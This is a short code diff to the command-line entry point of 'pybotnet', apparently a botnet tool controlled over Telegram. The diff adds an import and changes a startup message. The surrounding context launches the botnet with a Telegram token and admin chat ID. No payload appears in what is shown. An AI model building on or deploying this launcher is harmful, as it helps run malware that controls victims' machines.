@@ -1,6 +1,7 @@
 import argparse
 
 from . import *
+import pybotnet
 
 """run pybotnet by (`python -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME]`)"""
 
@@ -54,6 +55,6 @@ if __name__ == "__main__":
         engine = TelegramEngine(token=args.token, admin_chat_id=args.id)
 
     if args.verbose:
-        print("[+] running botnet...")
+        print(f"[+] running pybotnet{package_info.__version__}")
 
     BotNet(engine, bot_name=args.name, debug=args.debug).run()
